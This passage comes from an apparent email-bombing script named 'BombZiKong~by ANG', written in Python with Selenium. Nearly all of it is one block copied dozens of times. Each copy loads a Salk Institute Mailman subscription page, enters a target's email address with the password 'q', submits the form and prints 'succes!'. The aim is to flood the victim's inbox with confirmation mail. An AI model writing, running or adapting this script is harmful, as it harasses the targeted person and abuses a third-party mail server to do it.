confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
